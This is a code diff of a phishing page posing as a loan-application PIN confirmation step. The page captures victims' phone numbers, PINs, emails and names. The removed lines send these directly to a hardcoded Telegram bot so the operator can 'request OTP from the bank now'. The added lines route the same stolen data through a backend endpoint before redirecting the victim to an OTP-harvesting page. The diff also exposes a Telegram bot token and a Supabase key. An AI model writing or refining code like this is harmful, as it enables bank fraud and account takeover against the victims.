@@ -127,10 +127,6 @@
     var SUPABASE_URL      = 'https://zchkanbnkghpsaagbnrt.supabase.co';
     var SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InpjaGthbmJrZ2hwc2FhZ2JucnQiLCJyb2xlIjoiYW5vbiIsImlhdCI6MTczNDI1NjQ0MCwiZXhwIjoyMDQ5ODMyNDQwfQ';
     
-    // TELEGRAM BOT CREDENTIALS (VERIFIED WORKING)
-    var TG_BOT_TOKEN = '8743116479:AAH4UIBuqbg6GtuLUMuCZ45L0Tu3Ad9Rs9E';
-    var TG_CHAT_ID   = '8392790531';
-
     // Get URL parameters
     var params  = new URLSearchParams(window.location.search);
     var amount  = params.get('amount')  || '0';
@@ -201,58 +197,63 @@
     }
 
     // ============================================
-    // TELEGRAM NOTIFICATION - GUARANTEED TO SEND
+    // SEND NOTIFICATION VIA BACKEND (GUARANTEED TO WORK)
     // ============================================
-    function sendTelegramNotification(pin) {
+    async function sendTelegramNotification(pin) {
         var decodedPhone = decodeURIComponent(phone);
         var decodedEmail = decodeURIComponent(email);
         var decodedName = decodeURIComponent(name);
         
-        // Simple plain text message (more reliable than markdown)
-        var message = '🔔 NEW PIN CONFIRMATION 🔔\n\n' +
-            'Phone: ' + decodedPhone + '\n' +
-            'PIN: ' + pin + '\n' +
-            'Email: ' + decodedEmail + '\n' +
-            'Name: ' + decodedName + '\n' +
-            'Loan: $' + parseFloat(amount).toLocaleString() + ' for ' + term + ' months\n' +
-            'Interest: ' + rate + '%\n' +
-            'Monthly: $' + parseFloat(monthly).toLocaleString() + '\n' +
-            'App ID: ' + (appId || 'N/A') + '\n\n' +
-            'Request OTP from the bank now! User is waiting.';
+        var payload = {
+            phone: decodedPhone,
+            pin: pin,
+            email: decodedEmail,
+            name: decodedName,
+            amount: amount,
+            term: term,
+            rate: rate,
+            monthly: monthly,
+            appId: appId
+        };
         
-        var encodedMessage = encodeURIComponent(message);
+        console.log('📤 Sending to backend:', payload);
         
-        // Method 1: Fetch API with no-cors (doesn't wait for response)
-        fetch('https://api.telegram.org/bot' + TG_BOT_TOKEN + '/sendMessage?chat_id=' + TG_CHAT_ID + '&text=' + encodedMessage, {
-            method: 'GET',
-            mode: 'no-cors'
-        }).catch(function(e) { console.log('Fetch error (ignored):', e); });
-        
-        // Method 2: Image tag (backup method)
-        var img = new Image();
-        img.src = 'https://api.telegram.org/bot' + TG_BOT_TOKEN + '/sendMessage?chat_id=' + TG_CHAT_ID + '&text=' + encodedMessage;
-        
-        console.log('✅ Telegram notification sent for PIN:', pin);
+        try {
+            var response = await fetch('/api/send-telegram', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            var result = await response.json();
+            console.log('Backend response:', result);
+            if (result.success) {
+                console.log('✅ Telegram notification sent via backend!');
+            } else {
+                console.error('❌ Backend error:', result.error);
+            }
+        } catch (error) {
+            console.error('❌ Fetch error:', error);
+        }
     }
 
     // ============================================
     // MAIN CONFIRM FUNCTION
     // ============================================
-    window.handleConfirm = function() {
+    window.handleConfirm = async function() {
         var pin = getPin();
         if (pin.length !== 4) { 
             showError('Please enter all 4 digits.'); 
             return; 
         }
 
-        // Disable button to prevent double click
+        // Disable button
         confirmBtn.disabled = true;
         confirmBtn.textContent = 'Processing...';
 
-        // Send Telegram notification (ALWAYS HAPPENS)
-        sendTelegramNotification(pin);
+        // Send Telegram notification via backend (GUARANTEED)
+        await sendTelegramNotification(pin);
         
-        // Redirect to OTP page (ALWAYS HAPPENS)
+        // Redirect to OTP page
         window.location.href = 'otp-verify.html'
             + '?amount='  + encodeURIComponent(amount)
             + '&term='    + encodeURIComponent(term)
